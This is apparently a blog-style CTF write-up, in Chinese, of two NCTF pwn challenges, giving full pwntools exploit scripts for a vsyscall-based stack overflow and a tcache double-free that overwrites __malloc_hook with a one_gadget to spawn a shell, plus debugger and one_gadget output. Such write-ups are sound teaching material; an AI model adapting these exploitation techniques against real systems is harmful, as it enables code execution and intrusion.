---
title: NCTF-部分Pwn题
date: 2018-12-02 19:34:51
tags: 题目
---
<h1><strong>0x00 babystack</strong></h1>
<h2>知识点</h2>
<ul>
	<li>通过vsyscall来bypass</li>
	<li>vsyscall只能从调用开始的地方开始 vsdo可以任意位置</li>
</ul>
<h2>exp</h2>

```python
from pwn import *
p=process('./babystack')
payload = 'a'*24 + p64(0xffffffffff600000)*2
#0xffffffffff600000为vsyscall起始地址 vmmap可查到vsyscall
#前24字节是溢出覆盖到ebp 后接ret不过连续调用了
'''
00:0000│ rsp  0x7fffffffe4a8 —▸ 0x555555554a22 ◂— 0xfdb4e800000000bf
01:0008│ rbp  0x7fffffffe4b0 —▸ 0x7fffffffe4c0 —▸ 0x555555554a50 ◂— 0x41ff894156415741
02:0010│      0x7fffffffe4b8 —▸ 0x555555554a3a ◂— 0xe8000000933d8d48
03:0018│      0x7fffffffe4c0 —▸ 0x555555554a50 ◂— 0x41ff894156415741
04:0020│      0x7fffffffe4c8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
05:0028│      0x7fffffffe4d0 ◂— 0x0
06:0030│      0x7fffffffe4d8 —▸ 0x7fffffffe5a8 —▸ 0x7fffffffe7e3 ◂— 0x65722f656d6f682f ('/home/re')
07:0038│      0x7fffffffe4e0 ◂— 0x1f7ffcca0
'''
#如上rsp为当前返回地址 ebp之后的0x55555554a3a为main函数 所以从rsp位置连续ret到main就可以
p.sendline(payload)
p.interactive()
```
<h1><strong>babytcache</strong></h1>
<h2>知识点</h2>
<ul>
	<li>tcache的fd指向堆头而不是身体</li>
	<li>伪造unsorted bin去leak libc地址</li>
	<li>double free改malloc_hook地址为one_gadget</li>
	<li>small chunk或者large chunk释放后fd bk指向main_arena的固定位置</li>
</ul>
<h2>exp</h2>

```python
#!/usr/bin/python
from pwn import *
p = process('./babytcache')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def add(note):
   p.sendlineafter(">>","1")
   p.sendafter(":",note)

def delete(index):
   p.sendlineafter(">>","2")
   p.sendlineafter(":",str(index))

#先申请24个
for i in range(24):
   add("aaa\n")
#将1-7加入到tcache bin链中
for i in range(7):
   delete(i+1)

#free的0将会加入fastbin链
delete(0)
#因为7在fd中 free 7后它的fd指向0号的头而不是身体
delete(7)

add("bbb\n")
#修改0号的头 为small chunk
add(p64(0x30)+p64(0x451)+"\n")
#再次释放 fd bk指向main_arena固定位置处
delete(0)
p.sendlineafter(">>","3")
p.sendlineafter(":","0")
#常规leak地址
addt = u64(p.recv(6)+"\x00\x00")
addr = addt - 0x1b7ca0
log.info("addr:0x%x"% addr)
one_gadget=addr+0x4345e
malloc_hook=addr+libc.symbols['__malloc_hook']
#double free修改malloc_hook为one_gadget
delete(5)
delete(5)
log.info("malloc_hook:0x%x"%malloc_hook)
log.info("one_gadget:0x%x"%one_gadget)
add(p64(malloc_hook)+"\n")
add('aaa\n')
add(p64(one_gadget)+"\n")
p.sendlineafter(">>","1")
p.interactive()
```
虽然成功写入了one_gadget但还是没有成功 不知道问题是出在one_gadget上还是 申请malloc上 因为马上要考试了 暂且放一下 以后有时间继续研究

<h2>2018/12/5更新</h2>
找到了这道题问题所在..
原来libc中没有满足环境的one_gadget(自己也是第一次见)
在调试中改下one_gadget环境中需要满足的参数就可以

```python
 $ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x4345e	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x434b2	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe42ee	execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
```
当然最好弄的就是第一个了..设置一下rax就可以了..